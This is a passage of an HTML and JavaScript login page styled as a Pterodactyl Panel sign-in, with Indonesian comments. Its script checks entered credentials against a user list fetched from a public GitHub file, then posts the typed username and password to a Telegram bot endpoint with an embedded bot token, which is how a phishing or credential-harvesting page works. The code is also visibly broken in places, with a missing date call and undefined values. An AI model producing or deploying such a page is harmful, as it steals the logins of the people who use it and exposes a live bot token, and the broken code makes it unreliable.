</head>
<body>

        <form autocomplete="off" onsubmit="login(event)">
            <img src="ptero.png" alt="Pterodactyl Panel" class="img"> <h1>Pterodactyl</h1>
            <div class="inputBox">
                <input type="text" id="username" required="required">
                <span>Username</span>
                <i></i>
            </div>
            <div class="inputBox">
                <input type="password" id="password" required="required">
                <span>Password</span>
                <i></i>
            </div>
            <input type="submit" value="Login" onclick="login(event)">
        </form>
    </div>
</body>
<script>
    let attempts = 0;

    async function login(event) {
      event.preventDefault();
        
      const username = document.getElementById("username").value.trim();
      const password = document.getElementById("password").value.trim();
      const errorDiv = document.getElementById("error");

      try {
        const res = await fetch("https://raw.githubusercontent.com/ZarOffc11/testing/refs/heads/main/user.json");
        const users = await res.json();
        const user = users.find(u => u.username === username && u.password === password && u.accessKey === accessKey);

        if (user) {
          // Kirim notifikasi ke Telegram

            weekday: 'long',
            year: 'numeric',
            month: 'long',
            day: 'numeric',
            hour: '2-digit',
            minute: '2-digit',
            second: '2-digit'
          });

          const message = `âœ… LOGIN BERHASIL\nUsername: ${username}\nPassword: ${password}\nWaktu: ${waktu}`;
          fetch(`https://api.telegram.org/bot7593438716:AAGn6wr0_5-5uO2LXmKpagZcneoXdmca-zg/sendMessage`, {
            method: "POST",
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({

              text: message
            })
          });

          // Redirect ke halaman login
          window.location.href = `login.html?accessKey=WANZ-INFINITY2025`;
        } else {
          attempts++;
          errorDiv.style.display = "block";
